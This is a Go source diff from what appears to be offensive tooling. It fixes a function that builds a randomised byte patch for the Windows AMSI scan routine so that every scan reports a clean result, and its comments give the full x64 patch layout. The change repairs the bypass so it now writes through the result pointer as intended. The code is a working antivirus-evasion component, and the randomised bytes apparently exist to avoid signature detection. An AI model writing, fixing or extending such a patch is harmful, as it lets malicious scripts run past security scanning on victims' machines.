@@ -77,23 +77,30 @@ func randomZeroReg() []byte {
 //	    AMSI_RESULT *result         // [rsp+30h] (#6)
 //	);
 //
-// On x64, only the first 4 params go in registers. The 6th param
-// (AMSI_RESULT *result) is at [rsp+0x30] (offset 0x28 from the
-// return-address frame, plus 8 for the alignment slot = 0x30).
+// The 6th parameter is a POINTER to AMSI_RESULT. We must dereference
+// it and write 0 (AMSI_RESULT_CLEAN) to the pointed-to memory.
 //
-// The patch writes 0 to *result (AMSI_RESULT_CLEAN), zeros EAX
-// (HRESULT = S_OK), and returns.
+// Patch layout (16 bytes):
+//
+//	48 8B 44 24 30    mov rax, qword ptr [rsp+0x30]   ; load result pointer
+//	C7 00 00 00 00 00 mov dword ptr [rax], 0           ; *result = 0
+//	XX XX             zero eax (HRESULT = S_OK)
+//	C3                ret
+//	CC ...            int3 padding
 func randomAmsiPatchBytes() []byte {
 	reg := randomZeroReg()
 	patch := make([]byte, patchLen)
-	// mov dword ptr [rsp+0x30], 0  — write AMSI_RESULT_CLEAN
-	// C7 44 24 30 00 00 00 00
-	patch[0] = 0xC7
-	patch[1] = 0x44
-	patch[2] = 0x24
-	patch[3] = 0x30
-	// bytes 4..7 = 0 (immediate dword 0)
-	off := 8
+	// mov rax, qword ptr [rsp+0x30]  — load AMSI_RESULT* from 6th arg
+	patch[0] = 0x48
+	patch[1] = 0x8B
+	patch[2] = 0x44
+	patch[3] = 0x24
+	patch[4] = 0x30
+	// mov dword ptr [rax], 0  — write AMSI_RESULT_CLEAN
+	patch[5] = 0xC7
+	patch[6] = 0x00
+	// bytes 7..10 = 0 (immediate dword 0)
+	off := 11
 	copy(patch[off:], reg)
 	off += len(reg)
 	patch[off] = 0xC3
